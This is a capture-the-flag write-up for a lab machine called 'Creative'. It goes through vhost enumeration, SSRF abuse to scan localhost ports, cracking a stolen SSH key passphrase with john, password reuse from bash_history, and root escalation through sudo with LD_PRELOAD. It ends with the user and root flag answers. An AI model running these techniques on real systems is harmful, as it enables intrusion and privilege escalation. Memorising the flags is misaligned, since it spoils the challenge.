# Creative
(flags are at the end of the writeup)

### boot2root
Initial scan shows port 22 and 80 open.

    # Nmap 7.94SVN scan initiated Sun Oct 27 20:21:21 2024 as: /usr/lib/nmap/nmap --privileged -p22,80 -sV -sC -oN scan 10.10.239.164
    Nmap scan report for 10.10.239.164
    Host is up (0.045s latency).
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 a0:5c:1c:4e:b4:86:cf:58:9f:22:f9:7c:54:3d:7e:7b (RSA)
    |   256 47:d5:bb:58:b6:c5:cc:e3:6c:0b:00:bd:95:d2:a0:fb (ECDSA)
    |_  256 cb:7c:ad:31:41:bb:98:af:cf:eb:e4:88:7f:12:5e:89 (ED25519)
    80/tcp open  http    nginx 1.18.0 (Ubuntu)
    |_http-title: Did not follow redirect to http://creative.thm
    |_http-server-header: nginx/1.18.0 (Ubuntu)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Since port 80 is redirecting packets to creative.thm, add the following line to the `/etc/hosts` file

    Target_IP creative.thm
I started enumerating, the webpage has nothing interesting. I used gobuster to enumerate directories and subdomains, but nothing. Then I used it again to enumerate vhosts. The command I used is the following: `gobuster vhost -u "http://10.10.239.164" --domain creative.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --exclude-length 250-320`. 
Here's the explanation for this command: 

    gobuster vhost: use the vhost enumeration mode
    -u: specify host
    --domain: specify domain name
    -w: specify wordlist
    --append-domain: adds "creative.thm" to the terms from the wordlist
    --exclude-length 250-320: filters answers based on the length between 250 and 320, avoiding error messages.
![image](https://github.com/user-attachments/assets/b8231f8a-0c5b-4180-aa84-85fdf19658a3)<br />
To access `beta.creative.thm`, add it into the `/etc/hosts` file. Tne page seems to be a page to test the existence of a URL: <br />
![image](https://github.com/user-attachments/assets/8fbf0464-82aa-4df1-89ed-6ee75514a2e2)<br />
If I try to test my own URL using a netcat listener, we get a GET request from `python-request 2.28.2`. Some reaserch suggests that there's no usable vulnerability of this package. After that I tried to enumerate open ports on this host by submitting the URL `http://127.0.0.1:PORT`. To do that, I captured the request on burpsuite and copied it in a file called `request.req`:<br />
![image](https://github.com/user-attachments/assets/a57e31c3-6425-4440-9dc5-c2baedfe3519)<br />
Then I run the following command: `ffuf -request request.rec --request-proto http -w <(seq 1 65535) -fw 3`:<br />
![image](https://github.com/user-attachments/assets/6ab3e9dd-5cb8-42df-ab7b-ba0dfdff7714)<br />
Found port 1337 open:<br />
![image](https://github.com/user-attachments/assets/88686e03-df18-4530-a6c1-97231793052d)<br />
Navigating in the directories, I found saad's private key:<br />
![image](https://github.com/user-attachments/assets/1a404eb1-c861-430d-8a68-00d215975c8f)<br />
![image](https://github.com/user-attachments/assets/8d0cb5f2-978b-4655-83d8-b0c994700d60)<br />
So I'm gonna use it to login into his account.<br />
![image](https://github.com/user-attachments/assets/5c978bba-62d5-4a15-a6cf-a2d9d7cc8034)<br />
It asks for a passphrase. Run `ssh2john id_rsa > id_rsa.hash` and then `john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash`<br />
![image](https://github.com/user-attachments/assets/7f2d441a-dadf-48a6-b3b9-ef32af01e16a)<br />
I can now log into saad's account and get the user flag. Immediatly found some credentials in the bash_history file:<br />
![image](https://github.com/user-attachments/assets/9d1c792a-fc9b-423c-ab77-8a075b09bb12)<br />
And also some possible DB users:<br />
![image](https://github.com/user-attachments/assets/45e07072-d472-4625-b038-65f3f2b8a9ae)<br />
After enumerating the machine, I run `sudo -l`, when it prompts for the password, I used `MyStrongestPasswordYet$4291`<br />
![image](https://github.com/user-attachments/assets/ba605223-c8ed-4096-959e-a97842749146)<br />
There's no way to escalate to root using `ping`. But we can do it thanks to the LDPRELOAD. LDPRELOAD is an environment variable that let's you specify a shared library to load BEFORE executing the binary it self. Since we have sudo on the ping command, we can run it with root privileges, and use it to execute a shared library that we create. Create the exploit.c file(it's inside this folder), then compile it as a shared object using the following command: `gcc -fPIC -shared -o exploit.so exploit.c -nostartfiles`. And now run `sudo LD_PRELOAD=/home/saad/exploit.so ping`. If it asks for a password, use again `MyStrongestPasswordYet$4291`:<br />
![image](https://github.com/user-attachments/assets/a31637ad-4778-481b-acd8-55146aa32419)<br />







- What is user.txt? `9a1ce90a7653d74ab98630b47b8b4a84`
- What is root.txt? `992bfd94b90da48634aed182aae7b99f`

